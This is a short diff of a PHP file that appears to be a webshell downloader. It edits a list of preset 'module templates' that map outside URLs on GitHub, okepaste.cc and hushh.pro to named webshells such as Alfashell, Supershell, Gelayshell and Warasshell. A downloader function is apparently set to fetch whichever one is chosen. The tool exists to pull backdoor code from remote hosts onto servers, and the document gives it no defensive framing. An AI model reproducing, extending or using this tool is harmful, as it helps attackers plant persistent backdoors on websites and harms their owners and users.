@@ -13,11 +13,11 @@ $msg_class = "";
 // --- PRESET TEMPLATES ---
 $templates = [
     "" => "-- Select Module Template --",
-    "https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/ptsmc" => "Template 1: Alfashell",
-    "https://okepaste.cc/r/79e072b0" => "Template 2: Supershell",
+    "https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/ptsmc" => "Template 1: PTSMC",
+    "https://hushh.pro/a1/webshell/alfasc.txt" => "Template 2: Alfashell",
     "https://hushh.pro/a1/webshell/gelay.txt" => "Template 3: Gelayshell",
     "https://okepaste.cc/r/19c86cf0" => "Template 4: Warasshell",
-    "https://okepaste.cc/r/a7a6accd" => "Template 5: Wsoshell"
+    "https://okepaste.cc/r/79e072b0" => "Template 5: Supershell"
 ];
 
 // --- DOWNLOADER FUNCTION ---
